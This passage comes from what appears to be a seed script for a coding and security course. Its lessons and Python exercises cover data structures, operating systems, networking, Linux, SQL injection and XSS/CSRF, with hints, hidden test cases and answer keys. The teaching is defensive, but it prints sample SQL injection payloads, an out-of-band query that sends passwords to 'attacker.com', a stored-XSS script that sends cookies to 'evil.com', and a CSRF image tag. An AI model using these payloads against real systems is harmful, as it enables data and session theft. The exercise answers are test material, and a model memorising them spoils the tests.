\`\`\`python
def is_valid(s):
    stack = []
    pairs = {")": "(", "]": "[", "}": "{"}
    for char in s:
        if char in pairs.values():
            stack.append(char)
        elif char in pairs:
            if not stack or stack.pop() != pairs[char]:
                return False
    return len(stack) == 0
\`\`\`

## Real-World Applications

- **Browser history**: Stack of visited pages (back button = pop)
- **Undo/Redo**: Stack of operations
- **Function calls**: The call stack tracks which function returns where
- **Expression evaluation**: Stacks evaluate postfix notation
- **Memory management**: Linked lists manage free memory blocks

In security, understanding stacks is critical for **stack-based buffer overflow** attacks, where an attacker overwrites the return address on the call stack to redirect program execution.`,
    order: 2,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Valid Parentheses',
        slug: 'valid-parentheses',
        description: 'Write a function `is_valid_parentheses(s)` that takes a string containing only `()`, `{}`, and `[]` brackets, and returns `True` if the brackets are properly matched and nested, `False` otherwise.',
        starterCode: `def is_valid_parentheses(s):
    # Return True if brackets are properly matched
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use a stack. Push opening brackets onto the stack. When you see a closing bracket, pop from the stack and check if it matches.', xpCost: 5 },
          { level: 2, content: 'Map closing brackets to their opening counterparts: `pairs = {")": "(", "]": "[", "}": "{"}`. For each char: if opening, push; if closing, check stack top matches.', xpCost: 10 },
          { level: 3, content: 'Complete: `def is_valid_parentheses(s): stack = []; pairs = {")":"(","]":"[","}":"{"}; [stack.append(c) if c in pairs.values() else (None if not stack or stack.pop() != pairs[c] else None) for c in s]; return len(stack) == 0` — but use a proper loop for clarity.', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_valid_parentheses("()")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_valid_parentheses("()[]{}")', expectedOutput: 'True', isHidden: false, order: 2 },
          { input: 'is_valid_parentheses("(]")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'is_valid_parentheses("([)]")', expectedOutput: 'False', isHidden: true, order: 4 },
          { input: 'is_valid_parentheses("{[]}")', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Reverse Linked List',
        slug: 'reverse-linked-list',
        description: 'Write a function `reverse_linked_list(arr)` that takes a list representing a linked list (where each element is a node value in order) and returns the reversed list. For example, `reverse_linked_list([1, 2, 3, 4])` returns `[4, 3, 2, 1]`.',
        starterCode: `def reverse_linked_list(arr):
    # Return the reversed list
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Python lists have a built-in reverse method. You can use `arr[::-1]` or `list(reversed(arr))`.', xpCost: 5 },
          { level: 2, content: 'The simplest solution: `return arr[::-1]`', xpCost: 10 },
          { level: 3, content: 'Complete: `def reverse_linked_list(arr): return arr[::-1]`', xpCost: 20 },
        ],
        testCases: [
          { input: 'reverse_linked_list([1, 2, 3, 4])', expectedOutput: '[4, 3, 2, 1]', isHidden: false, order: 1 },
          { input: 'reverse_linked_list([1])', expectedOutput: '[1]', isHidden: false, order: 2 },
          { input: 'reverse_linked_list([])', expectedOutput: '[]', isHidden: true, order: 3 },
          { input: 'reverse_linked_list([5, 4, 3, 2, 1])', expectedOutput: '[1, 2, 3, 4, 5]', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // Lesson 2.3: Trees & Graphs
  const lesson2_3 = await createLessonWithExercises(phases[1].id, {
    title: 'Trees & Graphs',
    slug: 'trees-and-graphs',
    description: 'Explore tree traversals, binary search, and graph algorithms. These structures model hierarchies, networks, and relationships — essential for both software and security.',
    contentMdx: `# Trees & Graphs

Trees and graphs are the data structures that model relationships — file systems, network topologies, social connections, and dependency chains all use these structures.

## Binary Search

Before trees, let us master **binary search** — the algorithm that tree structures are built upon. Binary search finds an element in a **sorted** array in O(log n) time by repeatedly halving the search space:

\`\`\`python
def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = (left + right) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    return -1
\`\`\`

The key insight: each comparison eliminates **half** of the remaining elements. In an array of 1 billion elements, binary search needs at most 30 comparisons!

## Tree Traversals

A binary tree has three fundamental traversal orders:

1. **In-order** (Left, Root, Right) — produces sorted output for BSTs
2. **Pre-order** (Root, Left, Right) — useful for copying trees
3. **Post-order** (Left, Right, Root) — useful for deleting trees

\`\`\`python
def inorder(node):
    if node:
        inorder(node.left)
        print(node.val)
        inorder(node.right)
\`\`\`

## Graphs

A graph consists of **vertices** (nodes) and **edges** (connections). Graphs can be:
- **Directed** (one-way edges) or **undirected** (two-way)
- **Weighted** (edges have costs) or **unweighted**
- **Cyclic** (contains cycles) or **acyclic** (no cycles)

### Depth-First Search (DFS)

DFS explores as deep as possible along each branch before backtracking:

\`\`\`python
def dfs(graph, start, visited=None):
    if visited is None:
        visited = set()
    visited.add(start)
    for neighbor in graph[start]:
        if neighbor not in visited:
            dfs(graph, neighbor, visited)
    return visited
\`\`\`

### Breadth-First Search (BFS)

BFS explores all neighbors at the current depth before moving deeper:

\`\`\`python
from collections import deque

def bfs(graph, start):
    visited = set([start])
    queue = deque([start])
    while queue:
        node = queue.popleft()
        for neighbor in graph[node]:
            if neighbor not in visited:
                visited.add(neighbor)
                queue.append(neighbor)
    return visited
\`\`\`

## Security Applications

- **Network mapping**: Graphs model network topologies for attack path analysis
- **File system traversal**: Trees model directory structures for forensic analysis
- **Dependency analysis**: Graphs model software dependencies for vulnerability propagation
- **Binary search**: Used in fuzzing to find exact crash boundaries

Trees and graphs are the backbone of both software architecture and security analysis.`,
    order: 3,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Binary Search',
        slug: 'binary-search',
        description: 'Write a function `binary_search(arr, target)` that takes a sorted list of integers and a target integer, and returns the index of the target if found, or -1 if not found.',
        starterCode: `def binary_search(arr, target):
    # Return index of target in sorted arr, or -1 if not found
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use two pointers `left` and `right`. Calculate `mid = (left + right) // 2`. Compare arr[mid] to target and narrow the search range.', xpCost: 5 },
          { level: 2, content: 'While left <= right: mid = (left+right)//2; if arr[mid]==target: return mid; elif arr[mid]<target: left=mid+1; else: right=mid-1. Return -1 after loop.', xpCost: 10 },
          { level: 3, content: 'Complete: `def binary_search(arr, target): l, r = 0, len(arr)-1; while l<=r: m=(l+r)//2; if arr[m]==target: return m; l, r = (m+1, r) if arr[m]<target else (l, m-1); return -1`', xpCost: 20 },
        ],
        testCases: [
          { input: 'binary_search([1, 3, 5, 7, 9], 5)', expectedOutput: '2', isHidden: false, order: 1 },
          { input: 'binary_search([1, 3, 5, 7, 9], 4)', expectedOutput: '-1', isHidden: false, order: 2 },
          { input: 'binary_search([2, 4, 6, 8, 10, 12], 8)', expectedOutput: '3', isHidden: true, order: 3 },
          { input: 'binary_search([1], 1)', expectedOutput: '0', isHidden: true, order: 4 },
          { input: 'binary_search([], 5)', expectedOutput: '-1', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'DFS Traversal',
        slug: 'dfs-traversal',
        description: 'Write a function `dfs(graph, start)` that takes an adjacency list (dict mapping nodes to lists of neighbors) and a start node, and returns a list of nodes visited in DFS order.',
        starterCode: `def dfs(graph, start):
    # Return list of nodes in DFS order
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use recursion or an explicit stack. Keep a `visited` set and a `result` list. Mark start as visited, add to result, then recursively visit each unvisited neighbor.', xpCost: 5 },
          { level: 2, content: 'Create visited set and result list. Define inner function: `def _dfs(node): visited.add(node); result.append(node); [\\_dfs(n) for n in graph[node] if n not in visited]`. Call _dfs(start) and return result.', xpCost: 10 },
          { level: 3, content: 'Complete iterative: `def dfs(g, s): visited, result, stack = set(), [], [s]; while stack: n = stack.pop(); if n not in visited: visited.add(n); result.append(n); stack.extend(reversed(g.get(n, []))); return result`', xpCost: 20 },
        ],
        testCases: [
          { input: 'dfs({0: [1, 2], 1: [0, 3], 2: [0], 3: [1]}, 0)', expectedOutput: '[0, 1, 3, 2]', isHidden: false, order: 1 },
          { input: 'dfs({0: [1], 1: [0, 2], 2: [1]}, 0)', expectedOutput: '[0, 1, 2]', isHidden: false, order: 2 },
          { input: 'dfs({0: [1, 2], 1: [0], 2: [0, 3, 4], 3: [2], 4: [2]}, 2)', expectedOutput: '[2, 0, 1, 3, 4]', isHidden: true, order: 3 },
          { input: 'dfs({0: []}, 0)', expectedOutput: '[0]', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 2

  // ============================================================
  // PHASE 3: SYSTEMS & NETWORKS
  // ============================================================

  // Lesson 3.1: Operating Systems
  const lesson3_1 = await createLessonWithExercises(phases[2].id, {
    title: 'Operating Systems',
    slug: 'operating-systems',
    description: 'Understand how operating systems manage processes, memory, and file systems — the foundation for both system programming and security.',
    contentMdx: `# Operating Systems

The operating system is the software layer between your programs and the hardware. Understanding how it works is essential for writing efficient code, debugging performance issues, and — critically — understanding how attackers exploit system-level vulnerabilities.

## What an OS Does

An operating system manages three core resources:

1. **Processes** — Which programs run and when (CPU scheduling)
2. **Memory** — Which data lives where (memory management)
3. **Storage** — How files are organized (file systems)

## Processes

A **process** is a running instance of a program. The OS assigns each process a **Process ID (PID)** and manages its lifecycle:

- **Created** → **Ready** → **Running** → **Waiting** → **Terminated**

### CPU Scheduling Algorithms

The OS must decide which ready process gets the CPU next. Common algorithms:

| Algorithm | Description | Pros | Cons |
|-----------|-------------|------|------|
| **FCFS** | First Come, First Served | Simple, fair | Long wait times (convoy effect) |
| **SJF** | Shortest Job First | Optimal avg wait | Needs execution time prediction |
| **Round Robin** | Each process gets a time quantum | Fair, responsive | Context switch overhead |
| **Priority** | Higher priority goes first | Flexible | Starvation possible |

### Round Robin Scheduling

Round Robin is the most common interactive scheduling algorithm. Each process gets a fixed **time quantum** (e.g., 10ms). When the quantum expires, the process is moved to the back of the queue:

\`\`\`
Queue: [P1, P2, P3]  Quantum: 4
P1 runs 4 units → remaining: 2 → moves to back
P2 runs 4 units → remaining: 1 → moves to back
P3 runs 4 units → done!
P1 runs 2 units → done!
P2 runs 1 unit → done!
\`\`\`

## Memory Management

### Virtual Memory

Each process thinks it has the entire address space to itself. The OS maps **virtual addresses** to **physical addresses** using page tables:

\`\`\`
Virtual Address → [Page Table] → Physical Address
\`\`\`

### Stack vs Heap

- **Stack**: Fixed-size, LIFO, automatic management (function calls, local variables)
- **Heap**: Dynamic size, manual management (\`malloc\`/\`free\`), fragmentation risk

**Buffer overflows** happen when data written to a stack buffer overflows into adjacent memory — potentially overwriting return addresses.

## File Systems

The OS organizes data into a hierarchical structure:
- **Inodes** store file metadata (permissions, size, timestamps)
- **Directories** map names to inodes
- **Permissions** control who can read, write, or execute

Understanding permissions is crucial for security: misconfigured file permissions are one of the most common attack vectors.

## Security Implications

- **Privilege escalation**: Exploiting OS bugs to gain higher permissions
- **Race conditions**: Exploiting timing gaps in OS operations
- **Memory leaks**: Poor memory management leading to denial of service
- **File permission attacks**: Exploiting misconfigured access controls

The operating system is both your shield and your attack surface. Understanding it deeply makes you both a better developer and a more effective security professional.`,
    order: 1,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Process Scheduler',
        slug: 'process-scheduler',
        description: 'Write a function `round_robin(processes, quantum)` that simulates Round Robin CPU scheduling. `processes` is a list of tuples `(name, burst_time)`. Return a list of tuples `(name, time_started)` showing the order processes execute. Each process runs for min(quantum, remaining_burst_time) units.',
        starterCode: `def round_robin(processes, quantum):
    # Simulate Round Robin scheduling
    # processes: list of (name, burst_time) tuples
    # Return list of (name, time_started) tuples
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use a queue. Track remaining burst time for each process and current time. While the queue is not empty, dequeue a process, run it for min(quantum, remaining), record the start time, and re-enqueue if it still has burst time left.', xpCost: 5 },
          { level: 2, content: 'Initialize: queue = deque(processes as [name, remaining] lists), time = 0, result = []. While queue: pop left, run for min(quantum, remaining), append (name, time) to result, increment time, if remaining > 0 append back to queue.', xpCost: 10 },
          { level: 3, content: 'Complete: Use a queue of [name, remaining] lists. Loop while queue. Each iteration: pop, execute for min(quantum, remaining), record start time, update time, re-enqueue if remaining > 0. Return result.', xpCost: 20 },
        ],
        testCases: [
          { input: 'round_robin([("P1", 6), ("P2", 4)], 4)', expectedOutput: "[('P1', 0), ('P2', 4), ('P1', 8)]", isHidden: false, order: 1 },
          { input: 'round_robin([("A", 3)], 4)', expectedOutput: "[('A', 0)]", isHidden: false, order: 2 },
          { input: 'round_robin([("X", 8), ("Y", 4), ("Z", 2)], 3)', expectedOutput: "[('X', 0), ('Y', 3), ('Z', 6), ('X', 8), ('Y', 11), ('X', 13)]", isHidden: true, order: 3 },
          { input: 'round_robin([("P1", 10)], 2)', expectedOutput: "[('P1', 0), ('P1', 2), ('P1', 4), ('P1', 6), ('P1', 8)]", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // Lesson 3.2: Networking Fundamentals
  const lesson3_2 = await createLessonWithExercises(phases[2].id, {
    title: 'Networking Fundamentals',
    slug: 'networking-fundamentals',
    description: 'Learn how computers communicate — TCP/IP, DNS, HTTP, and the protocols that power the internet. This knowledge is essential for understanding network security.',
    contentMdx: `# Networking Fundamentals

Every cybersecurity professional must understand networking. Networks are the battlefield where most attacks occur, and you cannot defend what you do not understand.

## The OSI Model

The **Open Systems Interconnection (OSI)** model divides networking into 7 layers:

| Layer | Name | Example Protocols | What It Does |
|-------|------|-------------------|-------------|
| 7 | Application | HTTP, FTP, SMTP | User-facing services |
| 6 | Presentation | SSL/TLS, JPEG | Data formatting, encryption |
| 5 | Session | NetBIOS, RPC | Manages sessions |
| 4 | Transport | TCP, UDP | Reliable/unreliable delivery |
| 3 | Network | IP, ICMP | Routing between networks |
| 2 | Data Link | Ethernet, ARP | Frame delivery on local network |
| 1 | Physical | Cables, Wi-Fi | Raw bit transmission |

In practice, we often simplify to the **TCP/IP model** with 4 layers: Application, Transport, Internet, Network Access.

## TCP: Reliable Delivery

**Transmission Control Protocol (TCP)** provides reliable, ordered, error-checked delivery:

1. **Three-way handshake**: SYN → SYN-ACK → ACK
2. **Data transfer**: Sequenced packets with acknowledgments
3. **Connection teardown**: FIN → FIN-ACK → ACK

### TCP Flags

| Flag | Meaning |
|------|---------|
| SYN | Synchronize (start connection) |
| ACK | Acknowledge received data |
| FIN | Finish (close connection) |
| RST | Reset (abort connection) |
| PSH | Push (send data immediately) |
| URG | Urgent (priority data) |

## UDP: Fast but Unreliable

**User Datagram Protocol (UDP)** trades reliability for speed:
- No handshake, no acknowledgment, no ordering
- Used for DNS, DHCP, streaming, gaming
- Attackers love UDP for **amplification attacks** (small request → large response)

## Common Ports

| Port | Service | Security Relevance |
|------|---------|--------------------|
| 22 | SSH | Brute force target |
| 80 | HTTP | Web attacks |
| 443 | HTTPS | TLS attacks |
| 53 | DNS | DNS spoofing, amplification |
| 3306 | MySQL | Database attacks |
| 8080 | HTTP Proxy | Alternative web port |

## DNS: The Internet Phonebook

**Domain Name System (DNS)** translates domain names to IP addresses:

\`\`\`
User types "example.com" → DNS resolver → IP address 93.184.216.34
\`\`\`

DNS attacks include:
- **DNS spoofing/poisoning**: Returning fake IP addresses
- **DNS tunneling**: Exfiltrating data through DNS queries
- **DNS amplification**: Using open DNS resolvers for DDoS

## HTTP: The Web Protocol

**Hypertext Transfer Protocol (HTTP)** defines how web clients and servers communicate:

\`\`\`
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
\`\`\`

Key HTTP methods: GET (retrieve), POST (create), PUT (update), DELETE (remove).

Understanding these protocols at a deep level is what separates script kiddies from security professionals. When you can read a packet capture like a book, you are ready for network security.`,
    order: 2,
    xpReward: 60,
    category: 'cyber',
    exercises: [
      {
        title: 'Port Scanner',
        slug: 'port-scanner',
        description: 'Write a function `parse_port_scan(scan_output)` that parses a simulated port scan output string. The input is a multi-line string where each open port line follows the format: `"PORT/SERVICE STATE"`, e.g., `"22/tcp open"`. Return a list of dictionaries, each with keys `"port"`, `"protocol"`, and `"state"`, sorted by port number.',
        starterCode: `def parse_port_scan(scan_output):
    # Parse port scan output and return list of dicts
    # Each line: "PORT/PROTOCOL STATE"
    # Return: [{"port": 22, "protocol": "tcp", "state": "open"}, ...]
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Split the input by newlines. For each line, split by whitespace. Parse the first token by splitting on "/" to get port and protocol. The second token is the state.', xpCost: 5 },
          { level: 2, content: 'For each line: `parts = line.split()`, then `port_proto = parts[0].split("/")`, then `{"port": int(port_proto[0]), "protocol": port_proto[1], "state": parts[1]}`. Filter out empty lines and lines that do not match the format.', xpCost: 10 },
          { level: 3, content: 'Complete: split by newlines, skip lines without "/" in first token, parse each valid line, collect dicts, sort by port, return list.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_port_scan("22/tcp open\\n80/tcp open\\n443/tcp open")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'open'}, {'port': 80, 'protocol': 'tcp', 'state': 'open'}, {'port': 443, 'protocol': 'tcp', 'state': 'open'}]", isHidden: false, order: 1 },
          { input: 'parse_port_scan("8080/tcp open\\n22/tcp open")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'open'}, {'port': 8080, 'protocol': 'tcp', 'state': 'open'}]", isHidden: false, order: 2 },
          { input: 'parse_port_scan("53/udp open\\n22/tcp open\\n80/tcp closed")', expectedOutput: "[{'port': 22, 'protocol': 'tcp', 'state': 'closed'}, {'port': 53, 'protocol': 'udp', 'state': 'open'}, {'port': 80, 'protocol': 'tcp', 'state': 'closed'}]", isHidden: true, order: 3 },
          { input: 'parse_port_scan("3306/tcp open")', expectedOutput: "[{'port': 3306, 'protocol': 'tcp', 'state': 'open'}]", isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // Lesson 3.3: Linux & Command Line
  const lesson3_3 = await createLessonWithExercises(phases[2].id, {
    title: 'Linux & Command Line',
    slug: 'linux-and-command-line',
    description: 'Master the Linux command line — the primary tool for cybersecurity professionals, system administrators, and developers working with servers.',
    contentMdx: `# Linux & Command Line

Linux is the dominant operating system in cybersecurity. The majority of servers, security tools, and CTF environments run on Linux. Fluency with the command line is not optional — it is a requirement.

## Why Linux for Security?

- **Open source**: You can inspect, modify, and audit every line of code
- **Tool ecosystem**: Kali Linux, Parrot OS, and BlackArch provide thousands of security tools
- **Server dominance**: Over 90% of cloud infrastructure runs Linux
- **Control**: Granular permissions, scripting, and automation capabilities

## Essential Commands

### Navigation & File Operations

| Command | Purpose | Example |
|---------|---------|---------|
| \`ls\` | List directory contents | \`ls -la /\` |
| \`cd\` | Change directory | \`cd /var/log\` |
| \`pwd\` | Print working directory | \`pwd\` |
| \`cat\` | Display file contents | \`cat /etc/passwd\` |
| \`grep\` | Search text patterns | \`grep "error" /var/log/syslog\` |
| \`find\` | Find files | \`find / -name "*.conf"\` |
| \`chmod\` | Change permissions | \`chmod 600 secret.key\` |
| \`chown\` | Change ownership | \`chown root:root /etc/shadow\` |

### Process & Network

| Command | Purpose | Example |
|---------|---------|---------|
| \`ps\` | List processes | \`ps aux\` |
| \`top\` | Monitor processes | \`top\` |
| \`netstat\` | Network connections | \`netstat -tlnp\` |
| \`ss\` | Socket statistics | \`ss -tlnp\` |
| \`curl\` | HTTP requests | \`curl -v https://target.com\` |

## File Permissions

Linux uses a three-tier permission model:

\`\`\`
-rw-r--r-- 1 alice developers 4096 Jan 15 10:30 notes.txt
│├──┤├──┤├──┤
│ │   │   └── Others: read only
│ │   └────── Group: read only
│ └────────── Owner: read + write
└───────────── Type: regular file (-), directory (d), link (l)
\`\`\`

Permission values: read (4) + write (2) + execute (1). So \`chmod 755\` means:
- Owner: 7 (4+2+1 = rwx)
- Group: 5 (4+1 = r-x)
- Others: 5 (4+1 = r-x)

## Log Analysis

System logs are your primary forensic evidence:

\`\`\`bash
# Apache access log example
192.168.1.100 - - [15/Jan/2024:10:30:45 +0000] "GET /admin HTTP/1.1" 403 289
192.168.1.100 - - [15/Jan/2024:10:30:46 +0000] "GET /admin HTTP/1.1" 403 289
192.168.1.100 - - [15/Jan/2024:10:30:47 +0000] "POST /login HTTP/1.1" 401 145
\`\`\`

Suspicious patterns include:
- Repeated 403/401 responses (brute force attempts)
- Requests for \`/etc/passwd\` or \`/wp-admin\` (probing)
- Unusual HTTP methods (PUT, DELETE on read-only endpoints)
- Requests at unusual hours

## Scripting

Bash and Python scripts automate repetitive security tasks:

\`\`\`python
#!/usr/bin/env python3
# Simple log parser for suspicious activity
import re

with open("/var/log/apache2/access.log") as f:
    for line in f:
        if re.search(r' (403|401) ', line):
            ip = line.split()[0]
            print(f"Suspicious activity from {ip}")
\`\`\`

Master the command line, and you will work faster, investigate deeper, and automate the tedious parts of security analysis.`,
    order: 3,
    xpReward: 60,
    category: 'cyber',
    exercises: [
      {
        title: 'Log Parser',
        slug: 'log-parser',
        description: 'Write a function `parse_access_log(log_lines)` that takes a list of Apache access log strings and returns a list of IPs that have more than 3 failed requests (status codes 401 or 403). Each log line format: `IP - - [timestamp] "METHOD PATH HTTP/version" STATUS SIZE`.',
        starterCode: `def parse_access_log(log_lines):
    # Return list of IPs with more than 3 failed requests (status 401 or 403)
    pass`,
        language: 'python',
        order: 1,
        xpReward: 35,
        hints: [
          { level: 1, content: 'For each line, extract the IP (first token) and the status code (second-to-last token). Count failed requests per IP. Return IPs where count > 3.', xpCost: 5 },
          { level: 2, content: 'Use a dictionary to track failed counts per IP. For each line: `parts = line.split()`, ip = parts[0], status = parts[-2]. If status in ("401", "403"): increment count for that IP. Return [ip for ip, count in dict.items() if count > 3].', xpCost: 10 },
          { level: 3, content: 'Complete: `def parse_access_log(log_lines): failed = {}; [failed.__setitem__(p[0], failed.get(p[0],0)+1) for l in log_lines if (p:=l.split()) and p[-2] in ("401","403")]; return [ip for ip,c in failed.items() if c > 3]` — but use a readable loop approach.', xpCost: 20 },
        ],
        testCases: [
          { input: 'parse_access_log(["10.0.0.1 - - [date] \\"GET /admin HTTP/1.1\\" 403 100", "10.0.0.1 - - [date] \\"POST /login HTTP/1.1\\" 401 100", "10.0.0.1 - - [date] \\"GET /secret HTTP/1.1\\" 403 100", "10.0.0.1 - - [date] \\"POST /login HTTP/1.1\\" 401 100", "10.0.0.2 - - [date] \\"GET /home HTTP/1.1\\" 200 500"])', expectedOutput: "['10.0.0.1']", isHidden: false, order: 1 },
          { input: 'parse_access_log(["10.0.0.1 - - [d] \\"GET / HTTP/1.1\\" 403 1", "10.0.0.1 - - [d] \\"GET / HTTP/1.1\\" 403 1", "10.0.0.2 - - [d] \\"GET / HTTP/1.1\\" 200 1"])', expectedOutput: '[]', isHidden: false, order: 2 },
          { input: 'parse_access_log(["10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 401 1", "10.0.0.5 - - [d] \\"GET / HTTP/1.1\\" 200 1"])', expectedOutput: "['10.0.0.5']", isHidden: true, order: 3 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // ============================================================
  // PHASE 4: WEB SECURITY
  // ============================================================

  // Lesson 4.1: SQL Injection
  const lesson4_1 = await createLessonWithExercises(phases[3].id, {
    title: 'SQL Injection',
    slug: 'sql-injection',
    description: 'Learn about the most dangerous web vulnerability — SQL injection. Understand how attackers exploit it and how to write secure database queries.',
    contentMdx: `# SQL Injection

SQL Injection (SQLi) has been at or near the top of the OWASP Top 10 for over a decade. It allows attackers to execute arbitrary SQL commands on a database, potentially reading, modifying, or deleting all data. It is devastating, common, and entirely preventable.

## How SQL Injection Works

When an application constructs SQL queries by concatenating user input, an attacker can inject malicious SQL:

\`\`\`python
# VULNERABLE CODE — NEVER DO THIS
username = request.form["username"]
query = f"SELECT * FROM users WHERE username = '{username}'"
\`\`\`

If the attacker enters \`' OR '1'='1\`, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1'
\`\`\`

Since \`'1'='1'\` is always true, this returns **every row** in the users table!

## Types of SQL Injection

### 1. In-Band (Classic) SQLi

The attacker uses the same channel to inject and retrieve results:

\`\`\`
Input: ' UNION SELECT username, password FROM admins--
\`\`\`

The \`UNION\` operator appends a second SELECT query, leaking data from other tables.

### 2. Blind SQLi

The application does not return query results directly, but the attacker can infer information:

**Boolean-based**: Inject a condition and observe different responses:
\`\`\`
Input: ' AND 1=1-- (returns normal page)
Input: ' AND 1=2-- (returns different page → condition is injectable)
\`\`\`

**Time-based**: Use conditional delays to extract data bit by bit:
\`\`\`
Input: ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
\`\`\`

### 3. Out-of-Band SQLi

The attacker exfiltrates data through a different channel (DNS, HTTP requests):
\`\`\`
Input: '; EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 password FROM users) + '.share'--
\`\`\`

## Prevention

### Parameterized Queries (Prepared Statements)

The gold standard defense — **always use parameterized queries**:

\`\`\`python
# SECURE CODE — ALWAYS DO THIS
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
\`\`\`

The database treats the parameter as **data**, not executable SQL — making injection impossible.

### Input Validation

Validate and sanitize all user input:
- Use **allowlists** (not blocklists) for expected input patterns
- Limit input length and character set
- Never trust client-side validation alone

### Least Privilege

Database accounts should have the minimum permissions needed:
- Application accounts should NOT be able to \`DROP TABLE\`
- Read-only accounts for queries that do not need writes
- Separate accounts for different operations

### Defense in Depth

Layer your defenses:
1. Parameterized queries (primary)
2. Input validation (secondary)
3. Web Application Firewall (WAF) (tertiary)
4. Database monitoring and alerting

SQL injection is the poster child for "easy to prevent, devastating when ignored." There is no excuse for vulnerable code in modern applications.`,
    order: 1,
    xpReward: 75,
    category: 'cyber',
    exercises: [
      {
        title: 'SQL Injection Detector',
        slug: 'sql-injection-detector',
        description: 'Write a function `detect_sqli(input_string)` that takes a string and returns `True` if it contains common SQL injection patterns, `False` otherwise. Detect: `\' OR`, `UNION SELECT`, `; DROP`, `--`, `1=1`, and `SLEEP(` (case-insensitive).',
        starterCode: `def detect_sqli(input_string):
    # Return True if input contains SQL injection patterns
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Convert the input to lowercase, then check if any of the known SQL injection pattern substrings are present: `"\' or"`, `"union select"`, `"; drop"`, `"--"`, `"1=1"`, `"sleep("`.', xpCost: 5 },
          { level: 2, content: 'Define a list of patterns: `patterns = ["\' or", "union select", "; drop", "--", "1=1", "sleep("]`. Then: `return any(p in input_string.lower() for p in patterns)`', xpCost: 10 },
          { level: 3, content: 'Complete: `def detect_sqli(s): s = s.lower(); return any(p in s for p in ["\\x27 or","union select","; drop","--","1=1","sleep("])`', xpCost: 20 },
        ],
        testCases: [
          { input: `detect_sqli("' OR 1=1--")`, expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'detect_sqli("normal user input")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'detect_sqli("1 UNION SELECT * FROM users")', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: `detect_sqli("admin'; DROP TABLE users;--")`, expectedOutput: 'True', isHidden: true, order: 4 },
          { input: 'detect_sqli("Hello World")', expectedOutput: 'False', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 1

  // Lesson 4.2: XSS & CSRF
  const lesson4_2 = await createLessonWithExercises(phases[3].id, {
    title: 'XSS & CSRF',
    slug: 'xss-and-csrf',
    description: 'Understand Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) — two of the most prevalent web attacks that target users rather than servers.',
    contentMdx: `# XSS & CSRF

While SQL injection attacks the database, **XSS** and **CSRF** attack the **user**. These client-side vulnerabilities are widespread, dangerous, and often underestimated.

## Cross-Site Scripting (XSS)

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping. The attacker injects malicious JavaScript that executes in the victim's browser.

### Stored XSS (Persistent)

The malicious script is **stored** on the server (e.g., in a comment, profile field) and served to every user who views the page:

\`\`\`html
<!-- Attacker posts this comment -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
\`\`\`

Every user who views the comment has their cookies stolen.

### Reflected XSS (Non-Persistent)

The malicious script is **reflected** back from the server in the response — typically via a URL parameter:

\`\`\`
https://example.com/search?q=<script>alert('XSS')</script>
\`\`\`

The server embeds the search term in the response without escaping, and the script executes.

### DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript — the server never sees the payload:

\`\`\`javascript
// VULNERABLE: Directly inserting URL fragment into DOM
document.getElementById("output").innerHTML = location.hash.slice(1);
\`\`\`

### XSS Prevention

1. **Output encoding**: Escape all user input based on context (HTML, JavaScript, URL, CSS)
2. **Content Security Policy (CSP)**: Restrict which scripts can execute
3. **HTTP-only cookies**: Prevent JavaScript from accessing session cookies
4. **Input validation**: Validate and sanitize all user input

## Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user into performing an unwanted action on a site where they are already logged in:

\`\`\`html
<!-- Attacker's page — victim visits this -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
\`\`\`

If the victim is logged into their bank, the browser automatically sends the session cookie with this request — and the transfer goes through!

### CSRF Prevention

1. **CSRF Tokens**: Include a unique, unpredictable token in every state-changing form
